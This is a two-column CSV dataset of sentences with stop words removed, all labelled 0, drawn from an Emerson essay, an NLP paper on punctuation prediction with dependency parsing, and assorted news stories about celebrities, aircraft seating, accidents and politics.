Sentence,Label
" Every true man cause, country, age; requires infinite spaces numbers time fully accomplish design; — posterity seem follow steps train clients",0
" A man Caesar born, ages Roman Empire",0
" Christ born, millions minds grow cleave genius, confounded virtue possible man",0
" An institution lengthened shadow one man; as, Monachism, Hermit Antony; Reformation, Luther; Quakerism, Fox; Methodism, Wesley; Abolition, Clarkson",0
" Scipio, Milton called height Rome; history resolves easily biography stout earnest persons",0
 Standard automatic speech recognizers output unstructured streams words,0
" They neither perform proper segmentation output sentences, predict punctuation symbols",0
" The unavailable punctuations sentence boundaries transcribed speech texts create barriers many subsequent processing tasks, summarization, information extraction, question answering machine translation",0
" Thus, segmentation long texts necessary many real applications",0
" For example, speech-to-speech translation, continuously transcribed speech texts need segmented fed subsequent machine translation systems (Takezawa et al",0
", 1998; Nakamura, 2009)",0
" This current machine translation (MT) systems perform translation sentence level, various models used MT trained segmented sentences many algorithms inside MT exponential complexity regard length inputs",0
 The punctuation prediction problem attracted research interest speech processing community natural language processing community,0
" Most previous work primarily exploits local features statistical models lexicons, prosodic cues hidden event language model (HELM) (Liu et al",0
", 2005; Matusov et al",0
", 2006; Huang Zweig, 2002; Stolcke Shriberg, 1996)",0
 The word-level models integrating local features narrow views input could achieve satisfied performance due limited context information access (Favre et al,0
", 2008)",0
" Naturally, global contexts required model punctuation prediction, especially long-range dependencies",0
" For instance, English question sentences, ending question mark long-range dependent initial phrases (Lu Ng, 2010), could Figure 1",0
 There work trying incorporate syntactic features broaden view hypotheses punctuation prediction models (Roark et al,0
", 2006; Favre et al",0
", 2008)",0
" In methods, punctuation prediction treated separated post-procedure parsing, may suffer problem error propagation",0
" In addition, approaches able incrementally process inputs efficient long inputs, especially cases long transcribed speech texts presentations number streaming words could larger hundreds thousands",0
" In paper, propose jointly performing punctuation prediction transition-based dependency parsing transcribed speech text",0
" When transition-based parsing consumes stream words left right shift-reduce decoding algorithm, punctuation symbols predicted word based contexts parsing tree",0
 Two models proposed cause punctuation prediction interact transition actions parsing,0
 One conduct transition actions parsing followed punctuation predictions cascaded way,0
" The associate conventional transition actions parsing punctuation perditions, predicted punctuations directly inferred parsing tree",0
 Our models linear complexity capable handling streams words length,0
" In addition, computation models use rich set syntactic features, improve complicated punctuation predictions global view, especially long range dependencies",0
 Figure 1 shows example parsing helps punctuation prediction transcribed speech text,0
" As illustrated Figure 1(b), two commas predicted preceding words act adverbial modifiers (advmod) parsing",0
 The period word menu predicted parsing adverbial clause modifier (advcl) completed,0
" The question mark end input determined direct object modifier (dobj) identified, together long range clue auxiliary word occurs nominal subject (nsubj)",0
" Eventually, two segmentations formed according punctuation prediction results, shown Figure 1(c)",0
" The training data used models adapted Treebank data excluding punctuations keeping punctuation contexts, simulate unavailable annotated transcribed speech texts",0
" In decoding, beam search used get optimal punctuation prediction results",0
 We conduct experiments IWSLT data TDT4 test data sets,0
 The experimental results show method achieve higher performance CRF-based baseline method,0
 The paper structured follows: Section 2 conducts survey related work,0
 The transitionbased dependency parsing introduced Section 3,0
 We explain approach predicting punctuations transcribed speech texts Section 4,0
 Section 5 gives results experiment,0
 The conclusion future work given Section 6,0
 Sentence boundary detection punctuation prediction extensively studied speech processing field attracted research interest natural language processing field well,0
 Most previous work exploits local features task,0
" Kim Woodland (2001), Huang Zweig (2002), Christensen et al",0
" (2001), Liu et al",0
" (2005) integrate prosodic features (pitch, pause duration, etc",0
") lexical features (words, n-grams, etc",0
") predict punctuation symbols speech recognition, Huang Zweig (2002) uses maximum entropy model, Christensen et al",0
" (2001) focus finite state multi-layer perceptron methods, Liu et al",0
 (2005) uses conditional random fields,0
" However, scenarios prosodic cues available due inaccessible original raw speech waveforms",0
 Matusov et al,0
 (2006) integrate segmentation features log-linear model statistical machine translation (SMT) framework improve translation performance translating transcribed speech texts,0
 Lu Ng (2010) uses dynamic conditional random fields perform sentence boundary sentence type prediction,0
 They achieved promising results English Chinese transcribed speech texts,0
" The work exploits local features, limited capturing long range dependencies punctuation prediction",0
" It natural incorporate global knowledge, syntactic information, improve punctuation prediction performance",0
 Roark et al,0
 (2006) use rich set non-local features including parser scores re-rank full segmentations,0
 Favre et al,0
 (2008) integrate syntactic information PCFG parser log-linear combine local features sentence segmentation,0
" The punctuation prediction works performed post-procedure step parsing, parse tree needs built advance",0
" As parsing stream words transcribed speech text exponentially complex, approaches feasible short input processing",0
" Unlike works, incorporate punctuation prediction parsing process left right input without length limitations",0
" Numerous dependency parsing algorithms proposed natural language processing community, including transition-based graph-based dependency parsing",0
" Compared graph-based parsing, transition-based parsing offer linear time complexity easily leverage non-local features models (Yamada Matsumoto, 2003; Nivre et al",0
", 2006b; Zhang Clark, 2008; Huang Sagae, 2010)",0
" Starting work (Zhang Nivre, 2011), paper extend transition-based dependency parsing sentence-level stream words integrate parsing punctuation prediction",0
 Joint POS tagging transition-based dependency parsing studied (Hatori et al,0
", 2011; Bohnet Nivre, 2012)",0
" The improvements reported joint model compared pipeline model Chinese richly inflected languages, shows also makes sense jointly perform punctuation prediction parsing, although two tasks POS tagging punctuation prediction different two ways: 1)",0
 The former usually works well-formed single sentence latter needs process multiple sentences lengthy,0
 2),0
 POS tags must-have features parsing punctuations not,0
 The parsing quality former sensitive performance entire task latter,0
 Orlando Bloom Miranda Kerr still love Actors Orlando Bloom Model Miranda Kerr want go separate ways ,0
" However , interview , Bloom said Kerr still love ",0
 Miranda Kerr Orlando Bloom parents two-year-old Flynn ,0
" Actor Orlando Bloom announced separation wife , supermodel Miranda Kerr ",0
" In interview US journalist Katie Couric , broadcast Friday (local time), Bloom said , &quot; sometimes life &apos;t go exactly plan hope &quot; ",0
" He Kerr still love , emphasised 36-year-old ",0
 &quot; We &apos;re going support one another love parents Flynn &quot; ,0
 Kerr Bloom married since 2010 ,0
 Their son Flynn born 2011 ,0
" Jet makers feud seat width big orders stake A row flared leading plane makers width tourist-class seats long-distance flights , setting tone bitter confrontation month &apos;s Dubai Airshow ",0
" The dispute focuses width seats provided long-haul flights economy passengers - always ones courted airlines , whose allocated space holds key efficiency claims latest jets offered Airbus SAS Boeing Co ",0
" Airbus week called industry standard would provide seat least 18 inches (46 cm) wide economy cabins , U",0
S,0
 arch-rival Boeing says airlines decide ,0
" The dispute comes plane makers vie sell ever-larger versions twin-engined long-distance aircraft , potentially record orders expected November 17-21 event ",0
 How back plane laid - particularly whether seating 9 10 abreast - central economic performance claims made new &quot; mini-jumbo &quot; jet designs ,0
 Boeing says revamped &quot; 777X &quot; hold 406 people based economy seats 17 inches wide set 10 row ,0
 Airbus says competing version A350 carry 350 people 18-inch-wide economy seat laid 9 abreast ,0
 Plane giants often trade blows technical matters advertising trade press ,0
" Now , Airbus appealing directly public ahead Dubai Airshow , 777X expected dominate 100 orders ",0
" It recently previewed may start new ad war showing financiers slide illustrating three people squashed together restaurant , titled &quot; Would You Accept This ? &quot; &quot; Boeing proposing long-distance flying seats narrower regional turbo-props , &quot; said Airbus sales chief John Leahy ",0
" As diets change , people get bigger plane seating radically changed ",0
" Between early 1970s , Boeing 747 jumbo defined modern long-haul travel , turn century , weight average American 40- 49-year-old male increased 10 per cent , according U",0
S,0
 Health Department Data ,0
 The waist average 21st-century American male 39,0
"7 inches , according U",0
S,0
 health statistics ,0
" Airbus says rival sticking seat concept 1950s , average girth newly christened &quot; jet set &quot; narrower ",0
 Airbus says commissioned research suggesting extra inch seat width improves sleep quality 53 per cent ,0
 Boeing disputes Airbus &apos;s figures seat measurements says manufacturers step decisions airlines balance fares facilities ,0
 It also says research shows cabin experience depends width seat ,0
" &quot; It really comes providing flexibility airlines allowing things believe need successful , &quot; said Boeing cabins expert Kent Craver ",0
 They &apos;t want us dictate makes profitable ,0
 They know business better anyone else ,0
" For flyers elbow room , suppliers increasingly issue could affect earnings ",0
" Behind dispute race plane orders least $ 700-billion estimated business list prices coming decades , enough tip scales U",0
S,0
 European exports ,0
" As Reuters first reported July , seat layout exactly drives battle latest jets ",0
" Both Airbus Boeing claim 20 per cent better efficiency per seat latest twin-engined long-haul designs market leader segment , 365-seat Boeing 777-300ER ",0
 Boeing &apos;s performance claims depend part comparing 10-abreast 777X original 9-abreast 777 design ,0
 The gain unit costs blunted compared 10-abreast use ,0
" &quot; The reason Boeing cram seats make plane competitive products , &quot; said Kevin Keniston , head passenger comfort Europe &apos;s Airbus ",0
" On hand , analysts say full 10-seat-per-row cabins existing 777s suggest many passengers voting denser layout , may go hand hand cheaper fares ",0
" &quot; Eighteen inches seat width would great passengers , reality business point Airbus proposal driven threat 777 , &quot; said cabin interiors expert Mary Kirby , founder editor Runway Girl Network ",0
 Airbus Boeing supply seats offer catalogue suppliers airlines choose ,0
 Globe-trotting jet sellers even carry tape measures check competing layouts ,0
" While boasting comfort , builders also offer jets high-density layouts low-cost airlines regional travel ",0
 Airbus offers 10-abreast A350 says yet sold ,0
" Until recently , Airbus stressing need cabin customization offering wider aisle seats jets ",0
" Without support maker large modern jets , experts say call new industry standard unlikely fly , could distract wave 777X sales ",0
 The FAA easing restrictions use electronic gadgets airplanes - though chatting cellphones still prohibited ,0
" Warplanes attack store Russian missiles port city Latakia , official says ",0
 It &apos;s apparent continuation Israel &apos;s campaign keep arms proliferating Mideast ,0
 A federal appeals court blocks judge &apos;s ruling NYPD &apos;s controversial tactic discriminates minorities ,0
 Nearly 100 African migrants hoping travel Algeria die thirst two trucks break middle Sahara ,0
" Experts say violence left 14 adults seven children dead nothing random chance , sign growing violence America ",0
 Rather rattled U,0
S,0
" government shutdown , investors kept focus probably matters more: Federal Reserve ",0
" The California woman plans challenge may first-of-its-kind citation , saying Internet-connected eyewear makes navigation easier ",0
 Police say video appears show Mayor Rob Ford smoking crack pipe ,0
 Even close allies keep things one another - work every angle find &apos;s held back ,0
" The Vatican wants know Catholic parishes around globe handle sensitive issues like contraception , divorce gay couples ",0
" Persons seriously injured following collision Early Friday afternoon , two car drivers seriously injured head-on collision Landesstraße 44 (a rural road)",0
" The police completely blocked road immediately , initially could make much comment cause accident ",0
" However , mention various witness statements first assessed ",0
 What certain 19-year-old female driver VW Golf driving direction Revensdorf 38-year-old man Gettorf came towards Hyundai ,0
" The two vehicles collided , whereby woman severely stuck took fire service almost half hour free vehicle wreckage ",0
 Initially actual cause accident remained unclear ,0
 Both unfortunate parties taken nearby hospitals ,0
 The road remained fully blocked around two hours ,0
 Fire crews called rescue lost puppy got stuck 50ft ground precarious ledge quarry Cocker spaniel Ruby run minor road crash She spotted three days later dog walker trapped quarry Firefighters abseil cliff face pluck dog certain death A puppy lucky escape fire crews called lift safety somehow got stuck 50ft precarious cliff ledge ,0
 Nine month-old cocker spaniel Ruby run involved road crash Sunday afternoon survived three days alone rescued quarry Wednesday ,0
" Her owners Scott Alderson , 25 , girlfriend Becky Hall , 20 , Flappit Quarry Denholme , West Yorkshire , reunited Ruby thanked West Yorkshire Fire Rescue Service ",0
 They searched frantically missing dog posted appeals social networking sites ran quarry following minor accident ,0
 At around 2,0
"15pm Wednesday , eagle-eyed dog walker spotted Ruby ledge quarry , stranded 50ft ",0
 A Technical Rescue Team Cleckheaton Fire Station rushed scene abseiled rescue Ruby used pet tube transport cliff ,0
 Specialist Technical Rescue Officer Andy Clayton said: &apos; She precarious situation ,0
 She right middle cliff face - 50ft top bottom ,0
 She move muscle rescue - frozen solid ,0
 But fine ,0
 She eating biscuits afterwards ,0
 This unusual call-out ,0
 The fact dog spotted unbelievable ,0
 Specialist Technical Rescue Officer Peter Lau said: &quot; Ruby lucky escape ,0
 &quot; The potential could seriously injured worse ,0
 Ruby taken vets check-up found fine exhaustion dehydration ,0
" Miss Hall , Halifax , West Yorkshire , said: &quot; Watching rescue terrifying ",0
 &quot; I could believe first place ,0
 It amazing get back arms ,0
 The vet said became exhausted collapsed would probably fallen ,0
 The firefighters amazing ,0
 It really daring ,0
 We grateful every single one absolutely tremendous ,0
" Mr Alderson , Keighley , added: &quot; We scared might fall stayed ",0
 &quot; The firefighters brilliant ,0
 I &apos;t believe ,0
" Report: Obama campaign considered dumping Biden Hillary Clinton President Barack Obama &apos;s closest advisers secretly considered replacing Vice President Joe Biden Hillary Clinton 2012 ticket , according New York Times ",0
" The revelation notable bombshell Mark Halperin John Heilemann &apos;s heavily anticipated 2012 campaign tome , &quot; Double Down: Game Change 2012 ",0
 &quot; The Times obtained copy forthcoming book reported Thursday evening President &apos;s top aides conducted &quot; extensive group-sessions polling late 2011 &quot; gauge whether dumping Biden could help bolster Obama &apos;s waning re-election hopes ,0
" According Times &apos; national political correspondent Jonathan Martin , book provides thorough account effort senior officials inside campaign White House , namely former White House Chief Staff Bill Daley , measure effect swapping former Secretary State Clinton Vice President would polls ",0
 The potential switch closely guarded secret within Chicago campaign infrastructure inside Oval Office ,0
" Only half dozen President &apos;s closest advisers -- including Daley , former Obama campaign chief Jim Messina , former White House senior advisers David Axelrod David Plouffe -- knew change consideration ",0
" &quot; Double Down &quot; claims Daley spearheaded effort replace Biden , despite &quot; close personal rapport , &quot; ultimately deciding move data showed adding Clinton ticket &apos;t &quot; materially improve Obama &apos;s odds ",0
" &quot; In interview Martin , Daley confirmed administration fact consider replacing Biden Clinton ",0
" &quot; I vocal looking whole bunch things , one , &quot; Daley told paper ",0
" You remember , point President awful shape , like , &quot; Holy Christ , ? &quot; While Daley characterized research &quot; due diligence , &quot; Martin told CNN &apos;s Anderson Cooper re-election campaign made significant investment finding whether move would pay dividends polls ",0
" &quot; Campaigns &apos;t spend kind money polling focus groups unless &apos;re seriously considering something , &quot; Martin said AC360 ",0
" It &apos;s unclear , however , whether Obama knew team exploring swap ",0